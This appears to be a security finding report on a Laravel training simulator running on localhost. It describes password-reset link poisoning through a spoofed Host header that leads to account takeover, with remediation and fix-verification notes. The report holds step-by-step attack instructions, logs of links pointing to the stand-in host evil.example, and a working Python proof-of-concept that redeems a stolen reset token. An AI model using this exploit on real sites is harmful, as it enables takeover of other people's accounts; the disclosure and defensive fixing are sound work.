# Password reset link poisoning via Host header leads to account takeover

**ID:** vuln-0004
**Severity:** HIGH
**Found:** 2026-11-08 16:45:34 UTC
**Target:** http://127.0.0.1:8088 (Amadus training simulator, Laravel 13)
**Method:** POST
**CWE:** CWE-346
**CVSS:** 7.5
**Confidence:** High
**Fix Effort:** Low

## Description

The application trusts the client-supplied `Host` header when building password-reset links. An unauthenticated attacker can request a password reset for any account (instructor or cadet) with a spoofed `Host`/`X-Forwarded-Host` header, causing the emailed reset link to point at an attacker-controlled domain. When the recipient clicks it, the reset token is disclosed to the attacker, who uses it on the real site to set a new password and take over the account.

## Evidence

Baseline request (valid Host) generated `http://127.0.0.1:8088/reset-password/2b8ecc…?email=mharper%40example.com`. Identical request with `Host: evil.example` generated `http://evil.example/reset-password/d45b9fd…?email=mharper%40example.com` — a live token bound to an attacker-controlled origin:

```text
[2026-11-08 19:40:37] MAIL: Reset your password
  Click: http://evil.example/reset-password/1b598c36b43ee78fa4be87cb598b4917fee5653c2a1a136603da342d0b77b59c?email=probe7c1f%40example.test
```

Redeeming that token on the real origin returned `302 /login` (success) and replaced the stored hash:

```text
attacker password "Taken9Pass!" valid: bool(true)
original password valid:                bool(false)
```

After applying the fix, the same spoofed request produced a link pinned to the configured application URL:

```text
http://127.0.0.1:8088/reset-password/b04b9806…?email=probe7c1f%40example.test
```

## Impact

Full account takeover of any user, including instructor accounts, without knowing the current password. Once logged in as the instructor, the attacker gains the full instructor plane: creating/approving/deleting cadet accounts, impersonating any cadet, reading all cadet PNRs and activity logs, grading, and scenario management.

## Counterevidence

Actively looked for mitigations: `bootstrap/app.php` sets `trustProxies(at: '*')`, which trusts Host/X-Forwarded-Host from any client rather than constraining it; no `URL::forceRootUrl` call exists anywhere in the app; `config/app.php` defaults APP_URL to `http://localhost` and the installer only writes it once during provisioning, so it never corrects the request-derived host at runtime; CSRF is enforced (invalid-token requests return 419) but the poisoned request carries a valid session token, so CSRF does not impede it; the generic response message prevents account enumeration but not poisoning. The only constraint found is that exploitation requires a mailer that actually delivers email — with the default `MAIL_MAILER=log` the link is only written to the server log, which local testing used to observe the generated URL. In any production deployment that sends real reset email, the chain executes as demonstrated.

## What Would Change This Severity

Confirmation that a production deployment sends password-reset email through a real mailer would move exploitation from demonstrated-link-poisoning to routine account takeover (raising attack complexity toward L); conversely, evidence that all deployments keep `MAIL_MAILER=log` would reduce practical impact to link generation only.

## Technical Analysis

`bootstrap/app.php` configures `$middleware->trustProxies(at: '*')`, so Laravel's request treats `Host` and `X-Forwarded-*` headers from any client as authoritative. `PasswordResetController::sendResetLink` triggers the framework's default `Illuminate\Auth\Notifications\ResetPassword` notification, whose `resetUrl()` builds `url(route('password.reset', ['token' => ..., 'email' => ...], false))`. With no forced root URL registered anywhere in the application, `UrlGenerator::formatRoot()` falls back to `$this->request->root()`, which reflects the attacker-supplied host. The generated absolute link therefore points at the attacker's domain while embedding a genuine, single-use reset token that is valid against the real application host. No custom `sendPasswordResetNotification` exists to override this behavior.

## Proof of Concept

1. Send `GET /forgot-password` to the deployed application with the `Host` header set to an attacker-controlled domain, obtaining the CSRF token and session cookie.
2. Submit `POST /forgot-password` with the same spoofed `Host` header and `email` set to the victim's email or username (both are accepted for lookup).
3. The application emails the victim a reset link whose host is the attacker's domain. The token itself is valid on the real application.
4. When the victim clicks the link, the attacker captures the token from their server logs.
5. Submit `GET /reset-password/{token}?email=victim@example.com` followed by `POST /reset-password` with `token`, `email`, and an attacker-chosen password on the real application host — the password is changed.
6. Log in with the attacker-chosen password; verified in testing that the hash in the database validates for the attacker password and no longer validates for the victim's original password.

```python
import re, requests

BASE = "http://127.0.0.1:8088"          # real application origin
SPOOF_HOST = "evil.example"             # attacker-controlled domain
PX = {"http": "http://127.0.0.1:48080"}  # capture proxy

s = requests.Session()
r = s.get(BASE + "/forgot-password", headers={"Host": SPOOF_HOST}, proxies=PX, timeout=15)
token = re.search(r'name="_token" value="([^"]+)"', r.text).group(1)

# 1. poisoned reset request for the victim (email OR username accepted)
r = s.post(BASE + "/forgot-password",
           data={"_token": token, "email": "probe7c1f"},
           headers={"Host": SPOOF_HOST}, proxies=PX, timeout=15, allow_redirects=False)
print("poisoned request:", r.status_code)

# 2. attacker reads the token from their domain's access log
#    (observed here in the application mail log):
#    http://evil.example/reset-password/1b598c36b43e...?email=probe7c1f%40example.test
reset_token = "1b598c36b43ee78fa4be87cb598b4917fee5653c2a1a136603da342d0b77b59c"
email = "probe7c1f@example.test"

# 3. redeem the token on the REAL origin and set an attacker password
s2 = requests.Session()
r = s2.get(BASE + f"/reset-password/{reset_token}", params={"email": email},
           proxies=PX, timeout=15)
token2 = re.search(r'name="_token" value="([^"]+)"', r.text).group(1)
r = s2.post(BASE + "/reset-password",
            data={"_token": token2, "token": reset_token, "email": email,
                  "password": "Taken9Pass!", "password_confirmation": "Taken9Pass!"},
            proxies=PX, timeout=15, allow_redirects=False)
print("password reset on real host:", r.status_code, r.headers.get("Location"))
```

## Remediation

Derive password-reset link origins from the configured application URL rather than the request. Apply the provided change (register a `ResetPassword::createUrlUsing` callback that builds the link from `config('app.url')`), and verify `APP_URL` is set to the real public origin on every deployment — the installer wizard already writes it during provisioning. Additionally, replace the blanket proxy trust in `bootstrap/app.php` (`trustProxies(at: '*')`) with the specific load-balancer/proxy IPs or header set in use, so `Host`/`X-Forwarded-*` headers are not accepted from arbitrary clients; this also hardens every other request-derived URL in the application.

## Fix Verification

Applicability: `fix_before` blocks were copied verbatim from the post-edit file state and `php -l app/Providers/AppServiceProvider.php` reports no syntax errors; the two hunks are non-contiguous (import block and boot body), filed as separate locations. Security closure: re-ran the spoofed `POST /forgot-password` with `Host: evil.example` after the patch — the generated link is now `http://127.0.0.1:8088/reset-password/<token>` (pinned to the configured application URL), so the attacker-controlled host no longer reaches the link on any code path that sends the notification; the URL is constructed solely from `config('app.url')` and the token/email, neither of which the requester influences at this sink. Bypass review: checked for sibling reset-link builders — only Laravel's default `ResetPassword` notification exists (no custom `sendPasswordResetNotification`, no other `resetUrl` caller), and the static callback overrides URL construction for every dispatch site including the API mirror `POST /api/auth/forgot-password`, which shares the controller; alternate inputs (X-Forwarded-Host, X-Forwarded-Proto, absolute-URI request line) no longer matter because the request is not consulted. Preserved behavior: the legitimate unspoofed flow was executed end-to-end after the fix (link generated, reset accepted `302`, login with the new password succeeds). Repository checks: `php artisan test tests/Feature/PasswordResetTest.php` → 11 passed, 56 assertions (includes the token-lookup and non-enumeration tests); `LandingAndApprovalTest`, `DualRoleDashboardTest`, `InstructorStudentManagementTest` → 32 passed, 190 assertions. Gap: the installer's `requirements` view still intentionally derives its default URL from the request (`$request->getSchemeAndHttpHost()`), which is display-only in a pre-provisioning wizard and unaffected by this change.

## Assumptions

Requires the deployment to deliver password-reset mail with a real mailer (any SMTP configuration) and to accept requests whose Host header the attacker can influence (shared hosting / vanity-domain DNS / cache poisoning). Local testing used the log mailer, which exposes the same URL-construction behavior.
